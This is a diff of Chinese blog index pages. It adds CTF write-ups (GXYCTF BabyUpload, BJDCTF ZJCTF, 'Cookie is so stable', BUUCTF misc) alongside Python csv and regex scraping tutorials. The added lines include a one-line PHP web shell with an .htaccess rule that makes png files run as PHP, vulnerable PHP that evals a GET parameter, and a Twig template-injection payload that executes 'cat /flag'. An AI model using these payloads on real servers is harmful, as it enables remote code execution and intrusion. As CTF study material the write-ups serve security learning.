+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php小马</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; eval($_POST[&quot;Da4er&quot;])&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">.htaccess</span><br><span class="line">&lt;FilesMatch &quot;png&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<img src="/GXYCTF2019-BabyUpload/2.png" class title="Da4er">
+<img src="/GXYCTF2019-BabyUpload/3.png" class title="Da4er">
+<img src="/GXYCTF2019-BabyUpload/4.png" class title="Da4er">
           
         
       
@@ -1129,13 +1352,16 @@
       
         
           
-            <p><script type="text/javascript" src="/js/src/bai.js"></script></p>
-<h3 id="读取csv文件"><a href="#读取csv文件" class="headerlink" title="读取csv文件"></a>读取csv文件</h3><p>通过csv.reader()和DictReader()两个函数<br>reader()函数返回一个迭代器 会包含表头 通过next函数可以跳过，但是它只能通过下标访问数据；<br>DictReader()函数返回一个字典，不包含表头，可以通过键名访问！！<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import csv</span><br><span class="line"># with open(&#39;1 (2).csv&#39;,&#39;r&#39;) as fp:</span><br><span class="line">#     reader&#x3D;csv.reader(fp)</span><br><span class="line">#     # next(reader)</span><br><span class="line">#     for x in reader:</span><br><span class="line">#         print(x)</span><br><span class="line">with open(&#39;1 (2).csv&#39;,&#39;r&#39;) as fp:</span><br><span class="line">    reader&#x3D;csv.DictReader(fp)</span><br><span class="line">    for i in reader:</span><br><span class="line">        print(i[&#39;学生姓名&#39;])</span><br></pre></td></tr></table></figure></p>
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<h3 id="读取csv文件"><a href="#读取csv文件" class="headerlink" title="读取csv文件"></a>读取csv文件</h3><p>通过csv.reader()和DictReader()两个函数<br>reader()函数返回一个迭代器 会包含表头 通过next函数可以跳过，但是它只能通过下标访问数据；<br>DictReader()函数返回一个字典，不包含表头，可以通过键名访问！！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import csv</span><br><span class="line"># with open(&#39;1 (2).csv&#39;,&#39;r&#39;) as fp:</span><br><span class="line">#     reader&#x3D;csv.reader(fp)</span><br><span class="line">#     # next(reader)</span><br><span class="line">#     for x in reader:</span><br><span class="line">#         print(x)</span><br><span class="line">with open(&#39;1 (2).csv&#39;,&#39;r&#39;) as fp:</span><br><span class="line">    reader&#x3D;csv.DictReader(fp)</span><br><span class="line">    for i in reader:</span><br><span class="line">        print(i[&#39;学生姓名&#39;])</span><br></pre></td></tr></table></figure>
+
 <hr>
 <h3 id="写入csv文件"><a href="#写入csv文件" class="headerlink" title="写入csv文件"></a>写入csv文件</h3><p>两个方法：<strong>一个通过writer()函数 一个通过Dictwriter()函数。</strong><br><strong>writerow() writerows()</strong><br>都是先将文件通过上面两个函数封装成对象，然后在对csv对象进行操作。<br><strong>注意Dictwriter()有两个参数一个是文件，另一个是表头(列表)，先调用writeheader()函数将表头写进去。</strong><br>这两个函数都可以写入，看给的数据：如果是元组用第一个函数；给的是字典用第二个函数。</p>
 <hr>
 <h3 id="项目"><a href="#项目" class="headerlink" title="项目"></a>项目</h3><p>项目说明：爬取豆瓣图片前十页，并用csv库存储下来。<br>代码如下：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import csv</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">header&#x3D;&#123;</span><br><span class="line">    &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.87 Safari&#x2F;537.36&quot;</span><br><span class="line">&#125;</span><br><span class="line">headers&#x3D;[&#39;书名&#39;,&#39;相关信息&#39;,&#39;评分&#39;]</span><br><span class="line">def spdier(url):</span><br><span class="line">    resp&#x3D;requests.get(url,headers&#x3D;header)</span><br><span class="line">    text&#x3D;resp.text</span><br><span class="line">    html&#x3D;BeautifulSoup(text,&quot;lxml&quot;)</span><br><span class="line">    # print(html.prettify())</span><br><span class="line">    alist&#x3D;html.find_all(&#39;a&#39;,class_&#x3D;&#39;title&#39;)</span><br><span class="line">    titles&#x3D;[]</span><br><span class="line">    for a in alist:</span><br><span class="line">        title&#x3D;list(a.stripped_strings)[0]</span><br><span class="line">        titles.append(title)</span><br><span class="line">    infolist&#x3D;html.find_all(&#39;div&#39;,class_&#x3D;&#39;desc&#39;)</span><br><span class="line">    infos&#x3D;[]</span><br><span class="line">    for info in infolist:</span><br><span class="line">        info1&#x3D;list(info.stripped_strings)[0]</span><br><span class="line">        infos.append(info1)</span><br><span class="line">    ratelist&#x3D;html.find_all(&#39;span&#39;,class_&#x3D;&#39;rating_nums&#39;)</span><br><span class="line">    rates&#x3D;[]</span><br><span class="line">    for i in ratelist:</span><br><span class="line">        rate&#x3D;list(i.stripped_strings)[0]</span><br><span class="line">        rates.append(rate)</span><br><span class="line">    books&#x3D;[]</span><br><span class="line">    for i in range(len(rates)):</span><br><span class="line">        book&#x3D;&#123;</span><br><span class="line">            &#39;书名&#39;:titles[i],</span><br><span class="line">            &#39;相关信息&#39;:infos[i],</span><br><span class="line">            &#39;评分&#39;:rates[i]</span><br><span class="line">        &#125;</span><br><span class="line">        books.append(book)</span><br><span class="line">    return books</span><br><span class="line">def csv_storage(list_books,filename):</span><br><span class="line">    with open(filename,&#39;w&#39;,encoding&#x3D;&#39;utf-8&#39;,newline&#x3D;&#39;&#39;) as fp:</span><br><span class="line">        writer&#x3D;csv.DictWriter(fp,headers)</span><br><span class="line">        writer.writeheader()</span><br><span class="line">        writer.writerows(list_books)</span><br><span class="line">def main():</span><br><span class="line">    base_url&#x3D;&quot;https:&#x2F;&#x2F;www.douban.com&#x2F;tag&#x2F;%E5%B0%8F%E8%AF%B4&#x2F;book?start&#x3D;&#123;&#125;&quot;</span><br><span class="line">    books&#x3D;[]</span><br><span class="line">    for i in range(0,136,15):</span><br><span class="line">        url&#x3D;base_url.format(i)</span><br><span class="line">        book&#x3D;spdier(url)</span><br><span class="line">        books +&#x3D;book</span><br><span class="line">    csv_storage(books,&#39;豆瓣图片.csv&#39;)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
 <hr>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>今天学习了csv库存储爬取下来的数据，通过这个项目巩固了学习的内容。</p>
 
@@ -1321,10 +1547,12 @@
       
         
           
-            <p><script type="text/javascript" src="/js/src/bai.js"></script></p>
+            <script type="text/javascript" src="/js/src/bai.js"></script>
 <h3 id="一-爬取中国诗词网"><a href="#一-爬取中国诗词网" class="headerlink" title="一.爬取中国诗词网"></a>一.爬取中国诗词网</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">def handler_url(url):</span><br><span class="line">    header&#x3D;&#123;</span><br><span class="line">        &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.87 Safari&#x2F;537.36&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    reponse&#x3D;requests.get(url,header)</span><br><span class="line">    text&#x3D;reponse.text</span><br><span class="line">    titles&#x3D;re.findall(r&#39;&lt;div\sclass&#x3D;&quot;cont&quot;&gt;.*?&lt;b&gt;(.*?)&lt;&#x2F;b&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    years&#x3D;re.findall(r&#39;&lt;p\sclass&#x3D;&quot;source&quot;&gt;&lt;a.*?&gt;(.*?)&lt;&#x2F;a&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    autors&#x3D;re.findall(r&#39;&lt;p\sclass&#x3D;&quot;source&quot;&gt;.*?&lt;a.*?&gt;.*?&lt;a.*?&gt;(.*?)&lt;&#x2F;a&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    contents_tmp&#x3D;re.findall(r&#39;&lt;p\sclass&#x3D;&quot;source&quot;&gt;.*?&lt;div\sclass&#x3D;&quot;contson&quot;\s.*?&gt;(.*?)&lt;&#x2F;div&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    contents&#x3D;[]</span><br><span class="line">    for c in contents_tmp:</span><br><span class="line">        x&#x3D;re.sub(r&#39;&lt;.*?&gt;&#39;,&#39;&#39;,c)</span><br><span class="line">        contents.append(x.strip())</span><br><span class="line">    poems&#x3D;[]</span><br><span class="line">    for value in zip(titles,years,autors,contents):</span><br><span class="line">        title,year,autor,content&#x3D;value</span><br><span class="line">        poem&#x3D;&#123;</span><br><span class="line">            &quot;title&quot;:title,</span><br><span class="line">            &quot;year&quot;:year,</span><br><span class="line">            &quot;autor&quot;:autor,</span><br><span class="line">            &quot;content&quot;:content</span><br><span class="line">        &#125;</span><br><span class="line">        poems.append(poem)</span><br><span class="line">    for a in poems:</span><br><span class="line">        print(a)</span><br><span class="line">def main():</span><br><span class="line">    base_url&#x3D;&quot;https:&#x2F;&#x2F;www.gushiwen.org&#x2F;default_&#123;&#125;.aspx&quot;</span><br><span class="line">    for i in range(1,7):</span><br><span class="line">        url&#x3D;base_url.format(i)</span><br><span class="line">        handler_url(url)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 <img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6/4.png" class title="Da4er">
 <img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6/5.png" class title="Da4er">
+
+
 <hr>
 <h3 id="二-爬取豆瓣热门图书"><a href="#二-爬取豆瓣热门图书" class="headerlink" title="二.爬取豆瓣热门图书"></a>二.爬取豆瓣热门图书</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">HEADERS&#x3D;&#123;</span><br><span class="line">    &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;80.0.3987.87 Safari&#x2F;537.36&quot;</span><br><span class="line">&#125;</span><br><span class="line">def get_detail_page(url):</span><br><span class="line">    resp&#x3D;requests.get(url,headers&#x3D;HEADERS)</span><br><span class="line">    text&#x3D;resp.text</span><br><span class="line">    detail_pages&#x3D;re.findall(r&#39;&lt;div\sclass&#x3D;&quot;main-bd&quot;&gt;.*?&lt;a\shref&#x3D;&quot;(.*?)&quot;&gt;.*?&lt;&#x2F;a&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    return detail_pages</span><br><span class="line">def handle_detail_page(url):</span><br><span class="line">    book&#x3D;&#123;&#125;</span><br><span class="line">    resp&#x3D;requests.get(url,headers&#x3D;HEADERS)</span><br><span class="line">    text&#x3D;resp.text</span><br><span class="line">    titles&#x3D;re.findall(r&#39;&lt;div\sclass&#x3D;&quot;article&quot;&gt;.*?&lt;span.*?&gt;(.*?)&lt;&#x2F;span&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    articles_tmp&#x3D;re.findall(r&#39;&lt;div\sid&#x3D;&quot;link-report&quot;&gt;.*?&lt;p&gt;.*&lt;&#x2F;p&gt;&#39;,text,re.DOTALL)</span><br><span class="line">    articles&#x3D;[]</span><br><span class="line">    for a in articles_tmp:</span><br><span class="line">        x&#x3D;re.sub(r&#39;&lt;.*?&gt;&#39;,&#39;&#39;,a)</span><br><span class="line">        y&#x3D;x.replace(&#39;\r&#39;,&#39;&#39;).replace(&#39;\n&#39;,&#39;&#39;)</span><br><span class="line">        a&#x3D;re.sub(r&#39;&lt;div\s.*?&gt;&#39;,&#39;&#39;,y)</span><br><span class="line">        b&#x3D;a.replace(&#39; &#39;,&#39;&#39;)</span><br><span class="line">        articles.append(b)</span><br><span class="line">    # print(articles)</span><br><span class="line">    # print(titles)</span><br><span class="line">    book&#x3D;&#123;</span><br><span class="line">        &#39;title&#39;:titles,</span><br><span class="line">        &#39;article&#39;:articles</span><br><span class="line">    &#125;</span><br><span class="line">    print(book)</span><br><span class="line">def main():</span><br><span class="line">    urls&#x3D;[]</span><br><span class="line">    base_url&#x3D;&quot;https:&#x2F;&#x2F;book.douban.com&#x2F;review&#x2F;best&#x2F;?start&#x3D;&#123;&#125;&quot;</span><br><span class="line">    for i in range(0,41,20):</span><br><span class="line">        url&#x3D;base_url.format(i)</span><br><span class="line">        urls.append(url)</span><br><span class="line">    for a in urls:</span><br><span class="line">        detail_urls&#x3D;get_detail_page(a)</span><br><span class="line">        for f in detail_urls:</span><br><span class="line">            handle_detail_page(f)</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 <img src="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6/1.png" class title="Da4er">
@@ -1515,10 +1743,21 @@
       
         
           
-            <p><script type="text/javascript" src="/js/src/bai.js"></script></p>
-<h3 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h3><p>打开网页通过阅读源码，知道我们要读到next.php的源码，还要使text文件的内容为”I have a dream”，所以可以使用php伪协议进行写入和读取。<br><img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/1.png" class title="Da4er"><br>得到next.php的源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">$_SESSION[&#39;id&#39;] &#x3D; $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;,</span><br><span class="line">        &#39;strtolower(&quot;\\1&quot;)&#39;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re &#x3D;&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">	@eval($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>用过分析知preg_replace()使用的/e模式可以存在远程执行代码，<a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">参考博客</a>，所以我们可以有两种方法进行读取flag。<br>第一种：利用给的getFlag()函数：<br><img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/2.png" class title="Da4er"><br>第二种可以通过构造post传参：<br><img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/3.png" class title="Da4er"></p>
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<h3 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h3><p>打开网页通过阅读源码，知道我们要读到next.php的源码，还要使text文件的内容为”I have a dream”，所以可以使用php伪协议进行写入和读取。</p>
+<img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/1.png" class title="Da4er">
+<p>得到next.php的源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">$_SESSION[&#39;id&#39;] &#x3D; $id;</span><br><span class="line"></span><br><span class="line">function complex($re, $str) &#123;</span><br><span class="line">    return preg_replace(</span><br><span class="line">        &#39;&#x2F;(&#39; . $re . &#39;)&#x2F;ei&#39;,</span><br><span class="line">        &#39;strtolower(&quot;\\1&quot;)&#39;,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foreach($_GET as $re &#x3D;&gt; $str) &#123;</span><br><span class="line">    echo complex($re, $str). &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getFlag()&#123;</span><br><span class="line">	@eval($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>用过分析知preg_replace()使用的/e模式可以存在远程执行代码，<a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">参考博客</a>，所以我们可以有两种方法进行读取flag。<br>第一种：利用给的getFlag()函数：</p>
+<img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/2.png" class title="Da4er">
+<p>第二种可以通过构造post传参：</p>
+<img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/3.png" class title="Da4er">
+
 <hr>
-<h3 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h3><p>Twig模板注入：<br>在cookie中存在，因为我们分析题目知，题目会把cookie中的user的值返回到登入后的页面中，而且没有进行过滤。<br>检测是哪种模板注入：输入49显示的是49，而不是7个7，说明是Twig模板注入，可以直接使用payload进行读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125;;</span><br></pre></td></tr></table></figure><br><img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/4.png" class title="Da4er"><br><img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/5.png" class title="Da4er"></p>
+<h3 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h3><p>Twig模板注入：<br>在cookie中存在，因为我们分析题目知，题目会把cookie中的user的值返回到登入后的页面中，而且没有进行过滤。<br>检测是哪种模板注入：输入49显示的是49，而不是7个7，说明是Twig模板注入，可以直接使用payload进行读取：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125;;</span><br></pre></td></tr></table></figure>
+<img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/4.png" class title="Da4er">
+<img src="/2-13-BJDCTF2020-ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4-Cookie-is-so-stable/5.png" class title="Da4er">
 
           
         
@@ -1663,7 +1902,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  320
+                  321
                 </span>
               
 
@@ -1702,21 +1941,48 @@
       
         
           
-            <p><script type="text/javascript" src="/js/src/bai.js"></script></p>
+            <script type="text/javascript" src="/js/src/bai.js"></script>
 <h3 id="john-in-the-middle"><a href="#john-in-the-middle" class="headerlink" title="john-in-the-middle"></a>john-in-the-middle</h3><hr>
-<p>打开流量包发现全是tcp,http协议，直接导出http对象。<br><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/1.png" class title="Da4er"><br>在http对象中有个logo.png，Stegsolve工具打开，分析颜色通道得到flag。<br><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/2.png" class title="Da4er"></p>
+<p>打开流量包发现全是tcp,http协议，直接导出http对象。</p>
+<img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/1.png" class title="Da4er">
+<p>在http对象中有个logo.png，Stegsolve工具打开，分析颜色通道得到flag。</p>
+<img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/2.png" class title="Da4er">
+
 <hr>
 <h3 id="谁赢了比赛"><a href="#谁赢了比赛" class="headerlink" title="谁赢了比赛"></a>谁赢了比赛</h3><hr>
-<p>binwalk分析一下发现里面有个压缩包，再用foremost分离出来，发现gif有秘密，爆破一下。<br><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/3.png" class title="Da4er"><br><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/4.png" class title="Da4er"><br><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/5.png" class title="Da4er"><br>分析gif图片，在第310帧发现假的flag，再用Stegsolve工具分析各个颜色通道，得到flag。<br><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/6.png" class title="Da4er"><br><img 